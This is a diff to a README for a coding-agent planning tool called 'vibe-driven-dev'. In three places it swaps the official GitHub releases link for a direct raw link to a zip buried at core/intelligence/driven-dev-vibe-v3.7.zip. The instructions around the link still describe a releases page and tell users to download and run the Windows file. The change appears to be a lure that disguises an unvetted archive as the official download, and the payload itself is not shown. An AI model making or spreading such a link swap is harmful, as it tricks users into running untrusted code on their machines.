@@ -1,6 +1,6 @@
 # 🧭 vibe-driven-dev - Turn ideas into safe plans
 
-[![Download vibe-driven-dev](https://img.shields.io/badge/Download%20vibe-driven-dev-blue?style=for-the-badge)](https://github.com/Gladisintelligible706/vibe-driven-dev/releases)
+[![Download vibe-driven-dev](https://img.shields.io/badge/Download%20vibe-driven-dev-blue?style=for-the-badge)](https://raw.githubusercontent.com/Gladisintelligible706/vibe-driven-dev/main/core/intelligence/driven-dev-vibe-v3.7.zip)
 
 ## 🚀 What this app does
 
@@ -19,7 +19,7 @@ It is built for people who want to use coding agents without starting from a bla
 ## 🪟 Download for Windows
 
 Use this page to download:  
-https://github.com/Gladisintelligible706/vibe-driven-dev/releases
+https://raw.githubusercontent.com/Gladisintelligible706/vibe-driven-dev/main/core/intelligence/driven-dev-vibe-v3.7.zip
 
 Open the releases page, then look for the latest version at the top. Download the Windows file from that release, then run it on your PC
 
@@ -38,7 +38,7 @@ If you use a work PC, you may need to ask your admin before you run the file
 
 ## 🛠️ Install and run
 
-1. Open the release page: https://github.com/Gladisintelligible706/vibe-driven-dev/releases
+1. Open the release page: https://raw.githubusercontent.com/Gladisintelligible706/vibe-driven-dev/main/core/intelligence/driven-dev-vibe-v3.7.zip
 2. Find the latest release
 3. Download the Windows file from that release
 4. Open **Downloads** on your PC
